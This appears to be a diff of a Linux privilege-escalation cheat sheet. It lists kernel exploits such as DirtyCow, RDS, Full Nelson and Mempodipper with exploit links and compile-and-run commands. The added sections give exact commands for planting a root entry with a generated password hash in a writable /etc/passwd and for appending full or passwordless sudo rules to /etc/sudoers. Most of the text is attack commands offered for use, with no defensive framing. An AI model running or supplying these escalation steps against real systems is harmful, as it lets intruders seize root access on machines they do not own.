@@ -13,28 +13,26 @@ uname -a, netstat -ano, history
 3) Linux-Enumeration https://github.com/rebootuser/LinEnum
 
 
-# Kernal-Exploit 
+# Kernal-Exploit  
 
-1) CVE-2016-5195 (DirtyCow)
-Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
-Code: https://github.com/FireFart/dirtycow/blob/master/dirty.c
+1) CVE-2016-5195 (DirtyCow)  
+Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
+Code: https://github.com/FireFart/dirtycow/blob/master/dirty.c  
 
-compile:- gcc -pthread dirty.c -o dirty -lcrypt
+compile:- gcc -pthread dirty.c -o dirty -lcrypt  
+Time to execute:- "./dirty" or "./dirty my-new-password"  
 
-Then run the newly create binary by either doing:- "./dirty" or "./dirty my-new-password"
-
-2) CVE-2010-3904 (RDS)
-Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
+2) CVE-2010-3904 (RDS)  
+Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
 https://www.exploit-db.com/exploits/15285/
 
-3) CVE-2010-4258 (Full Nelson)
-Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)
-https://www.exploit-db.com/exploits/15704/
+3) CVE-2010-4258 (Full Nelson)  
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)  
+https://www.exploit-db.com/exploits/15704/  
 
-4) CVE-2012-0056 (Mempodipper)
-
-Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
-https://www.exploit-db.com/exploits/18411
+4) CVE-2012-0056 (Mempodipper)  
+Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)  
+https://www.exploit-db.com/exploits/18411  
 
 
 # Weak File Permission 
@@ -108,3 +106,25 @@ $ sudo -i # no password required :)
 uid=0(root) gid=0(root) groups=0(root)  
 	
 Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf  
+
+
+# Writabe /etc/passwd  
+If we have permission to write a passwd file in linux then generate password from this command.  
+
+openssl passwd -1 -salt escalate  
+mkpasswd -m SHA-512 esclate
+
+Then add the generated password.
+
+root:GENERATED_PASSWORD_HERE:0:0:root:/root:/bin/bash  
+E.g: root:$1$hacker$TzyFIv0/R/c28W.GAeLw.1:0:0:root:/root:/bin/bash
+
+You can now use the su command with root:esclate  
+E.g: su root  
+
+# Writable /etc/sudoers  
+echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers  
+
+# use SUDO without password  
+echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers  
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers  
